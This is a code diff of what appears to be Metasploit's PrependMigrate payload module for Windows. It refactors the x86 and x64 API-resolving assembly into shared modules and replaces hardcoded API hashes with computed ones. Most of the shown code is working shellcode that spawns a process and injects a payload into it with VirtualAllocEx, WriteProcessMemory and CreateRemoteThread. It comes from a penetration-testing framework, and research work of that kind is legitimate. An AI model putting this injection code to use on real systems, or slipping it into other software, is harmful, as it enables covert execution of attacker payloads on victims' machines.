@@ -63,105 +63,35 @@ module Msf::Payload::Windows::PrependMigrate
     block_api_start = <<-EOS
       call start
     EOS
-    block_api_asm = <<-EOS
-    api_call:
-      pushad                    ; We preserve all the registers for the caller, bar EAX and ECX.
-      mov ebp, esp              ; Create a new stack frame
-      xor eax, eax              ; Zero EAX (upper 3 bytes will remain zero until function is found)
-      mov edx, [fs:eax+48]      ; Get a pointer to the PEB
-      mov edx, [edx+12]         ; Get PEB->Ldr
-      mov edx, [edx+20]         ; Get the first module from the InMemoryOrder module list
-    next_mod:                   ;
-      mov esi, [edx+40]         ; Get pointer to modules name (unicode string)
-      movzx ecx, word [edx+38]  ; Set ECX to the length we want to check
-      xor edi, edi              ; Clear EDI which will store the hash of the module name
-    loop_modname:               ;
-      lodsb                     ; Read in the next byte of the name
-      cmp al, 'a'               ; Some versions of Windows use lower case module names
-      jl not_lowercase          ;
-      sub al, 0x20              ; If so normalise to uppercase
-    not_lowercase:              ;
-      ror edi, 13               ; Rotate right our hash value
-      add edi, eax              ; Add the next byte of the name
-      loop loop_modname         ; Loop until we have read enough
-
-      ; We now have the module hash computed
-      push edx                  ; Save the current position in the module list for later
-      push edi                  ; Save the current module hash for later
-      ; Proceed to iterate the export address table
-      mov edx, [edx+16]         ; Get this modules base address
-      mov ecx, [edx+60]         ; Get PE header
-
-      ; use ecx as our EAT pointer here so we can take advantage of jecxz.
-      mov ecx, [ecx+edx+120]    ; Get the EAT from the PE header
-      jecxz get_next_mod1       ; If no EAT present, process the next module
-      add ecx, edx              ; Add the modules base address
-      push ecx                  ; Save the current modules EAT
-      mov ebx, [ecx+32]         ; Get the rva of the function names
-      add ebx, edx              ; Add the modules base address
-      mov ecx, [ecx+24]         ; Get the number of function names
-      ; now ecx returns to its regularly scheduled counter duties
-
-      ; Computing the module hash + function hash
-    get_next_func:              ;
-      jecxz get_next_mod        ; When we reach the start of the EAT (we search backwards), process the next module
-      dec ecx                   ; Decrement the function name counter
-      mov esi, [ebx+ecx*4]      ; Get rva of next module name
-      add esi, edx              ; Add the modules base address
-      xor edi, edi              ; Clear EDI which will store the hash of the function name
-      ; And compare it to the one we want
-    loop_funcname:              ;
-      lodsb                     ; Read in the next byte of the ASCII function name
-      ror edi, 13               ; Rotate right our hash value
-      add edi, eax              ; Add the next byte of the name
-      cmp al, ah                ; Compare AL (the next byte from the name) to AH (null)
-      jne loop_funcname         ; If we have not reached the null terminator, continue
-      add edi, [ebp-8]          ; Add the current module hash to the function hash
-      cmp edi, [ebp+36]         ; Compare the hash to the one we are searchnig for
-      jnz get_next_func         ; Go compute the next function hash if we have not found it
-
-      ; If found, fix up stack, call the function and then value else compute the next one...
-      pop eax                   ; Restore the current modules EAT
-      mov ebx, [eax+36]         ; Get the ordinal table rva
-      add ebx, edx              ; Add the modules base address
-      mov cx, [ebx+2*ecx]       ; Get the desired functions ordinal
-      mov ebx, [eax+28]         ; Get the function addresses table rva
-      add ebx, edx              ; Add the modules base address
-      mov eax, [ebx+4*ecx]      ; Get the desired functions RVA
-      add eax, edx              ; Add the modules base address to get the functions actual VA
-      ; We now fix up the stack and perform the call to the desired function...
-    finish:
-      mov [esp+36], eax         ; Overwrite the old EAX value with the desired api address for the upcoming popad
-      pop ebx                   ; Clear off the current modules hash
-      pop ebx                   ; Clear off the current position in the module list
-      popad                     ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
-      pop ecx                   ; Pop off the original return address our caller will have pushed
-      pop edx                   ; Pop off the hash value our caller will have pushed
-      push ecx                  ; Push back the correct return value
-      jmp eax                   ; Jump into the required function
-      ; We now automagically return to the correct caller...
-
-    get_next_mod:               ;
-      pop edi                   ; Pop off the current (now the previous) modules EAT
-    get_next_mod1:              ;
-      pop edi                   ; Pop off the current (now the previous) modules hash
-      pop edx                   ; Restore our position in the module list
-      mov edx, [edx]            ; Get the next module
-      jmp.i8 next_mod           ; Process this module
-    ;--------------------------------------------------------------------------------------
-    EOS
+    block_api_obj = Object.new.extend(Msf::Payload::Windows::BlockApi)
+    block_api_asm = block_api_obj.asm_block_api
 
     # Prepare default exit block (sleep for a long long time)
-    exitblock = <<-EOS
+    exitblock = %Q^
       ;sleep
       push -1
-      push 0xE035F044           ; hash( "kernel32.dll", "Sleep" )
+      push #{Rex::Text.block_api_hash("kernel32.dll", "Sleep")}           ; hash( "kernel32.dll", "Sleep" )
       call ebp                  ; Sleep( ... );
-    EOS
-
+    ^
+    
     # Check to see if we can find exitfunc in the payload
-    exitfunc_index = buf.index("\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06\x7C\x0A" +
-            "\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF\xD5")
+    exitfunc_block_asm = %Q^
+    exitfunk:
+      mov ebx, #{Rex::Text.block_api_hash("kernel32.dll", "ExitThread")}    ; The EXITFUNK as specified by user... kernel32.dll!ExitThread
+      push #{Rex::Text.block_api_hash("kernel32.dll", "GetVersion")}        ; hash( "kernel32.dll", "GetVersion" )
+      call ebp               ; GetVersion(); (AL will = major version and AH will = minor version)
+      cmp al, 6         ; If we are not running on Windows Vista, 2008 or 7
+      jl goodbye       ; Then just call the exit function...
+      cmp bl, 0xE0            ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...
+      jne goodbye      ;
+      mov ebx, #{Rex::Text.block_api_hash("ntdll.dll", "RtlExitUserThread")}    ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThreadgoodbye:                 ; We now perform the actual call to the exit function
+    goodbye:  
+      push 0x0            ; push the exit function parameter
+      push ebx               ; push the hash of the exit function
+      call ebp               ; call EXITFUNK( 0 );
+    ^
+    exitfunc_block_blob = Metasm::Shellcode.assemble(Metasm::Ia32.new, exitfunc_block_asm).encode_string
+    exitfunc_index = buf.index(exitfunc_block_blob)
     if exitfunc_index
       exitblock_offset = "0x%04x + payload - exitblock" % (exitfunc_index - 5)
       exitblock = "exitblock:\njmp $+#{exitblock_offset}"
@@ -205,7 +135,7 @@ module Msf::Payload::Windows::PrependMigrate
       add esp,-400              ; adjust the stack to avoid corruption
       lea edx,[esp+0x60]
       push edx
-      push 0xB16B4AB1           ; hash( "kernel32.dll", "GetStartupInfoA" )
+      push #{Rex::Text.block_api_hash("kernel32.dll", "GetStartupInfoA")}           ; hash( "kernel32.dll", "GetStartupInfoA" )
       call ebp                  ; GetStartupInfoA( &si );
 
       lea eax,[esp+0x60]        ; Put startupinfo pointer back in eax
@@ -228,7 +158,7 @@ module Msf::Payload::Windows::PrependMigrate
       push esi                  ; lpCommandLine
       push ebx                  ; lpApplicationName
 
-      push 0x863FCC79           ; hash( "kernel32.dll", "CreateProcessA" )
+      push #{Rex::Text.block_api_hash("kernel32.dll", "CreateProcessA")}           ; hash( "kernel32.dll", "CreateProcessA" )
       call ebp                  ; CreateProcessA( &si );
 
       ; if we didn't get a new process, use this one
@@ -256,7 +186,7 @@ module Msf::Payload::Windows::PrependMigrate
       xor ebx,ebx
       push ebx                  ; address
       push [edi]                ; handle
-      push 0x3F9287AE           ; hash( "kernel32.dll", "VirtualAllocEx" )
+      push #{Rex::Text.block_api_hash("kernel32.dll", "VirtualAllocEx")} ; hash( "kernel32.dll", "VirtualAllocEx" )
       call ebp                  ; VirtualAllocEx( ...);
 
       ; eax now contains the destination
@@ -268,7 +198,7 @@ module Msf::Payload::Windows::PrependMigrate
       begin_of_payload_return:  ; lpBuffer
       push eax                  ; lpBaseAddress
       push [edi]                ; hProcess
-      push 0xE7BDD8C5           ; hash( "kernel32.dll", "WriteProcessMemory" )
+      push #{Rex::Text.block_api_hash("kernel32.dll", "WriteProcessMemory")} ; hash( "kernel32.dll", "WriteProcessMemory" )
       call ebp                  ; WriteProcessMemory( ...)
 
       ; run the code (CreateRemoteThread())
@@ -280,7 +210,7 @@ module Msf::Payload::Windows::PrependMigrate
       push ebx                  ; stacksize
       push ebx                  ; lpThreadAttributes
       push [edi]
-      push 0x799AACC6           ; hash( "kernel32.dll", "CreateRemoteThread" )
+      push #{Rex::Text.block_api_hash("kernel32.dll", "CreateRemoteThread")} ; hash( "kernel32.dll", "CreateRemoteThread" )
       call ebp                  ; CreateRemoteThread( ...);
 
       #{exitblock}              ; jmp to exitfunc or long sleep
@@ -306,109 +236,39 @@ module Msf::Payload::Windows::PrependMigrate
     block_api_start = <<-EOS
       call start
     EOS
-    block_api_asm = <<-EOS
-    api_call:
-      push r9                  ; Save the 4th parameter
-      push r8                  ; Save the 3rd parameter
-      push rdx                 ; Save the 2nd parameter
-      push rcx                 ; Save the 1st parameter
-      push rsi                 ; Save RSI
-      xor rdx, rdx             ; Zero rdx
-      mov rdx, [gs:rdx+96]     ; Get a pointer to the PEB
-      mov rdx, [rdx+24]        ; Get PEB->Ldr
-      mov rdx, [rdx+32]        ; Get the first module from the InMemoryOrder module list
-    next_mod:                  ;
-      mov rsi, [rdx+80]        ; Get pointer to modules name (unicode string)
-      movzx rcx, word [rdx+74] ; Set rcx to the length we want to check
-      xor r9, r9               ; Clear r9 which will store the hash of the module name
-    loop_modname:              ;
-      xor rax, rax             ; Clear rax
-      lodsb                    ; Read in the next byte of the name
-      cmp al, 'a'              ; Some versions of Windows use lower case module names
-      jl not_lowercase         ;
-      sub al, 0x20             ; If so normalise to uppercase
-    not_lowercase:             ;
-      ror r9d, 13              ; Rotate right our hash value
-      add r9d, eax             ; Add the next byte of the name
-      loop loop_modname        ; Loop until we have read enough
-      ; We now have the module hash computed
-      push rdx                 ; Save the current position in the module list for later
-      push r9                  ; Save the current module hash for later
-      ; Proceed to iterate the export address table
-      mov rdx, [rdx+32]        ; Get this modules base address
-      mov eax, dword [rdx+60]  ; Get PE header
-      add rax, rdx             ; Add the modules base address
-      mov eax, dword [rax+136] ; Get export tables RVA
-      test rax, rax            ; Test if no export address table is present
-      jz get_next_mod1         ; If no EAT present, process the next module
-      add rax, rdx             ; Add the modules base address
-      push rax                 ; Save the current modules EAT
-      mov ecx, dword [rax+24]  ; Get the number of function names
-      mov r8d, dword [rax+32]  ; Get the rva of the function names
-      add r8, rdx              ; Add the modules base address
-      ; Computing the module hash + function hash
-    get_next_func:             ;
-      jecxz get_next_mod       ; When we reach the start of the EAT (we search backwards), process the next module
-      dec rcx                  ; Decrement the function name counter
-      mov esi, dword [r8+rcx*4]; Get rva of next module name
-      add rsi, rdx             ; Add the modules base address
-      xor r9, r9               ; Clear r9 which will store the hash of the function name
-      ; And compare it to the one we want
-    loop_funcname:             ;
-      xor rax, rax             ; Clear rax
-      lodsb                    ; Read in the next byte of the ASCII function name
-      ror r9d, 13              ; Rotate right our hash value
-      add r9d, eax             ; Add the next byte of the name
-      cmp al, ah               ; Compare AL (the next byte from the name) to AH (null)
-      jne loop_funcname        ; If we have not reached the null terminator, continue
-      add r9, [rsp+8]          ; Add the current module hash to the function hash
-      cmp r9d, r10d            ; Compare the hash to the one we are searchnig for
-      jnz get_next_func        ; Go compute the next function hash if we have not found it
-      ; If found, fix up stack, call the function and then value else compute the next one...
-      pop rax                  ; Restore the current modules EAT
-      mov r8d, dword [rax+36]  ; Get the ordinal table rva
-      add r8, rdx              ; Add the modules base address
-      mov cx, [r8+2*rcx]       ; Get the desired functions ordinal
-      mov r8d, dword [rax+28]  ; Get the function addresses table rva
-      add r8, rdx              ; Add the modules base address
-      mov eax, dword [r8+4*rcx]; Get the desired functions RVA
-      add rax, rdx             ; Add the modules base address to get the functions actual VA
-      ; We now fix up the stack and perform the call to the drsired function...
-    finish:
-      pop r8                   ; Clear off the current modules hash
-      pop r8                   ; Clear off the current position in the module list
-      pop rsi                  ; Restore RSI
-      pop rcx                  ; Restore the 1st parameter
-      pop rdx                  ; Restore the 2nd parameter
-      pop r8                   ; Restore the 3rd parameter
-      pop r9                   ; Restore the 4th parameter
-      pop r10                  ; pop off the return address
-      sub rsp, 32              ; reserve space for the four register params (4 * sizeof(QWORD) = 32)
-                               ; It is the callers responsibility to restore RSP if need be (or alloc more space or align RSP).
-      push r10                 ; push back the return address
-      jmp rax                  ; Jump into the required function
-      ; We now automagically return to the correct caller...
-    get_next_mod:              ;
-      pop rax                  ; Pop off the current (now the previous) modules EAT
-    get_next_mod1:             ;
-      pop r9                   ; Pop off the current (now the previous) modules hash
-      pop rdx                  ; Restore our position in the module list
-      mov rdx, [rdx]           ; Get the next module
-      jmp next_mod             ; Process this module
-    EOS
+    block_api_obj = Object.new.extend(Msf::Payload::Windows::BlockApi_x64)
+    block_api_asm = block_api_obj.asm_block_api
 
     # Prepare default exit block (sleep for a long long time)
     exitblock = <<-EOS
       ;sleep
       xor rcx,rcx
       dec rcx                   ; rcx = -1
-      mov r10d, 0xE035F044      ; hash( "kernel32.dll", "Sleep" )
+      mov r10d, #{Rex::Text.block_api_hash("kernel32.dll", "Sleep")}      ; hash( "kernel32.dll", "Sleep" )
       call rbp                  ; Sleep( ... );
     EOS
 
+    exitfunc_block_asm = %Q^
+    exitfunk:
+      mov ebx, #{Rex::Text.block_api_hash("kernel32.dll", "ExitThread")}   ; The EXITFUNK as specified by user...
+      mov r10d, #{Rex::Text.block_api_hash("kernel32.dll", "GetVersion")}  ; hash( "kernel32.dll", "GetVersion" )
+      call rbp              ; GetVersion(); (AL will = major version and AH will = minor version)
+      add rsp, 40           ; cleanup the default param space on stack
+      cmp al, 0x6           ; If we are not running on Windows Vista, 2008 or 7
+      jl goodbye            ; Then just call the exit function...
+      cmp bl, 0xE0          ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...
+      jne goodbye           ;
+      mov ebx, #{Rex::Text.block_api_hash("ntdll.dll", "RtlExitUserThread")}   ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread
+    goodbye:                ; We now perform the actual call to the exit function
+      push 0x0              ;
+      pop rcx               ; set the exit function parameter
+      mov r10d, ebx         ; place the correct EXITFUNK into r10d
+      call rbp              ; call EXITFUNK( 0 );
+    ^
     # Check to see if we can find x64 exitfunc in the payload
-    exitfunc_index = buf.index("\x41\xBA\xA6\x95\xBD\x9D\xFF\xD5\x48\x83\xC4\x28\x3C\x06" +
-        "\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x59\x41\x89\xDA\xFF\xD5")
+    
+    exitfunc_block_blob = Metasm::Shellcode.assemble(Metasm::X64.new, exitfunc_block_asm).encode_string
+    exitfunc_index = buf.index(exitfunc_block_blob)
     if exitfunc_index
       exitblock_offset = "0x%04x + payload - exitblock" % (exitfunc_index - 5)
       exitblock = "exitblock:\njmp $+#{exitblock_offset}"
@@ -451,7 +311,7 @@ module Msf::Payload::Windows::PrependMigrate
       ; get our own startupinfo at esp+0x60
       add rsp,-400              ; adjust the stack to avoid corruption
       lea rcx,[rsp+0x30]
-      mov r10d, 0xB16B4AB1      ; hash( "kernel32.dll", "GetStartupInfoA" )
+      mov r10d, #{Rex::Text.block_api_hash("kernel32.dll", "GetStartupInfoA")}       ; hash( "kernel32.dll", "GetStartupInfoA" )
       call rbp                  ; GetStartupInfoA( &si );
 
       jmp getcommand
@@ -473,7 +333,7 @@ module Msf::Payload::Windows::PrependMigrate
       mov r8, rcx               ; lpProcessAttributes
       mov rdx, rsi              ; lpCommandLine
       ; rcx is already zero     ; lpApplicationName
-      mov r10d, 0x863FCC79      ; hash( "kernel32.dll", "CreateProcessA" )
+      mov r10d, #{Rex::Text.block_api_hash("kernel32.dll", "CreateProcessA")}      ; hash( "kernel32.dll", "CreateProcessA" )
       call rbp                  ; CreateProcessA( &si );
 
       ; if we didn't get a new process, use this one
@@ -503,7 +363,7 @@ module Msf::Payload::Windows::PrependMigrate
     migrate_asm << <<-EOS
       xor rdx,rdx               ; address
       mov rcx, [rdi]            ; handle
-      mov r10d, 0x3F9287AE      ; hash( "kernel32.dll", "VirtualAllocEx" )
+      mov r10d, #{Rex::Text.block_api_hash("kernel32.dll", "VirtualAllocEx")}       ; hash( "kernel32.dll", "VirtualAllocEx" )
       call rbp                  ; VirtualAllocEx( ...);
 
       ; eax now contains the destination - save in ebx
@@ -517,7 +377,7 @@ module Msf::Payload::Windows::PrependMigrate
       pop r8                    ; lpBuffer
       mov rdx, rax              ; lpBaseAddress
       mov rcx, [rdi]            ; hProcess
-      mov r10d, 0xE7BDD8C5      ; hash( "kernel32.dll", "WriteProcessMemory" )
+      mov r10d, #{Rex::Text.block_api_hash("kernel32.dll", "WriteProcessMemory")}      ; hash( "kernel32.dll", "WriteProcessMemory" )
       call rbp                  ; WriteProcessMemory( ...);
 
       ; run the code (CreateRemoteThread())
@@ -529,7 +389,7 @@ module Msf::Payload::Windows::PrependMigrate
       mov r8, rcx               ; stacksize
       ;rdx already equals 0     ; lpThreadAttributes
       mov rcx, [rdi]
-      mov r10d, 0x799AACC6      ; hash( "kernel32.dll", "CreateRemoteThread" )
+      mov r10d, #{Rex::Text.block_api_hash("kernel32.dll", "CreateRemoteThread")}      ; hash( "kernel32.dll", "CreateRemoteThread" )
       call rbp                  ; CreateRemoteThread( ...);
 
       #{exitblock}              ; jmp to exitfunc or long sleep
